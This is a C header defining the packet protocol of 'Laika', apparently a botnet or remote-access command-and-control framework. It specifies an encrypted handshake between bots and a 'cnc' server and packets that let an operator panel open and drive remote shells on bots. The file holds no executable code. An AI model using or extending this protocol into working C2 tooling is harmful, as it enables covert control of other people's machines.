#ifndef LAIKA_PACKET_H
#define LAIKA_PACKET_H

#include <inttypes.h>

#define LAIKA_MAGIC "LAI\x12"
#define LAIKA_MAGICLEN 4

#define LAIKA_MAX_PKTSIZE 4096

#define LAIKA_HOSTNAME_LEN 64
#define LAIKA_IPV4_LEN INET_ADDRSTRLEN
#define LAIKA_INET_LEN INET_ADDRSTRLEN

#define LAIKA_SHELL_DATA_MAX_LENGTH 256

/* first handshake between peer & cnc works as so:
    - peer connects to cnc and sends a LAIKAPKT_HANDSHAKE_REQ with the peer's pubkey, hostname & inet ip
    - after cnc receives LAIKAPKT_HANDSHAKE_REQ, all packets are encrypted
    - cnc responds with LAIKAPKT_HANDSHAKE_RES
    - if peer is an authenticated client (panel), LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ is then sent
*/

/* encrypted packets are laid out like so: (any packet sent/received where peer->useSecure is true)
    LAIKAPKT_ID pktID; -- plain text
    uint8_t nonce[crypto_secretbox_NONCEBYTES]; -- plain text
    uint8_t body[pktSize + crypto_secretbox_MACBYTES]; -- encrypted with shared key & nonce
*/

/*
    any packet ending with *_RES is cnc 2 peer
    any packet ending with *_REQ is peer 2 cnc
    if packet doesn't have either, it can be sent & received by both peer & cnc
*/
enum {
/* ==================================================[[ Peer ]]================================================== */
    LAIKAPKT_VARPKT,
    /* layout of LAIKAPKT_VARPKT:
    *   LAIKAPKT_SIZE pktSize;
    *   LAIKAPKT_ID pktID;
    */
    LAIKAPKT_HANDSHAKE_REQ, /* first packet sent by peer & received by cnc */
    /* layout of LAIKAPKT_HANDSHAKE_REQ: *NOTE* ALL DATA IN THIS PACKET IS SENT IN PLAINTEXT!!
    *   uint8_t laikaMagic[LAIKA_MAGICLEN]; -- LAIKA_MAGIC
    *   uint8_t majorVer;
    *   uint8_t minorVer;
    *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- freshly generated pubKey to encrypt decrypted nonce with
    *   char hostname[LAIKA_HOSTNAME_LEN]; -- can be empty (ie. all NULL bytes)
    *   char inet[LAIKA_INET_LEN]; -- can be empty (ie. all NULL bytes)
    */
    LAIKAPKT_HANDSHAKE_RES,
    /* layout of LAIKAPKT_HANDSHAKE_RES:
    *   uint8_t cncEndian;
    */
    LAIKAPKT_SHELL_OPEN, /* if sent to bot, opens a shell. if sent to cnc, signifies you opened a shell */
    /* layout of LAIKAPKT_SHELL_OPEN:
    *   NULL (empty packet)
    */
    LAIKAPKT_SHELL_CLOSE, /* if sent to bot, closes a shell. if sent to cnc, signifies a shell was closed */
    /* layout of LAIKAPKT_SHELL_CLOSE:
    *   NULL (empty packet)
    */
    LAIKAPKT_SHELL_DATA, /* if sent to bot, writes data to stdin of shell. if sent to cnc, writes to 'stdout' of shell */
    /* layout of LAIKAPKT_SHELL_DATA
    *   char buf[VAR_PACKET_LENGTH];
    */
/* ==================================================[[ Auth ]]================================================== */
    LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ, /* second packet sent by authenticated peers (panel). there is no response packet */
    /* layout of LAIKAPKT_STAGE2_HANDSHAKE_REQ
    *   uint8_t peerType;
    */
    LAIKAPKT_AUTHENTICATED_ADD_PEER_RES, /* notification that a peer has connected to the cnc */
    /* layout of LAIKAPKT_AUTHENTICATED_ADD_PEER_RES
    *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
    *   char hostname[LAIKA_HOSTNAME_LEN];
    *   char inet[LAIKA_INET_LEN];
    *   char ipv4[LAIKA_IPV4_LEN];
    *   uint8_t peerType;
    */
    LAIKAPKT_AUTHENTICATED_RMV_PEER_RES, /* notification that a peer has disconnected from the cnc */
    /* layout of LAIKAPKT_AUTHENTICATED_RMV_PEER_RES
    *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
    *   uint8_t peerType;
    */
    LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ, /* panel requesting cnc open a shell on bot. there is no response packet, shell is assumed to be open */
    /* layout of LAIKAPKT_AUTHENTICATE_OPEN_SHELL_REQ
    *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
    */
    LAIKAPKT_AUTHENTICATED_SHELL_CLOSE, /* peer requesting close their currently opened shell (accepted by both cnc & panel) */
    /* layout of LAIKAPKT_AUTHENTICATED_SHELL_CLOSE_REQ:
    *   NULL (empty packet)
    */
    LAIKAPKT_AUTHENTICATED_SHELL_DATA, /* if sent to cnc, writes data to stdin of shell. if sent to panel, writes to 'stdout' of shell */
    /* layout of LAIKAPKT_SHELL_DATA
    *   char buf[VAR_PACKET_LENGTH];
    */
    LAIKAPKT_MAXNONE
};

typedef uint8_t LAIKAPKT_ID;
typedef uint16_t LAIKAPKT_SIZE;

#endif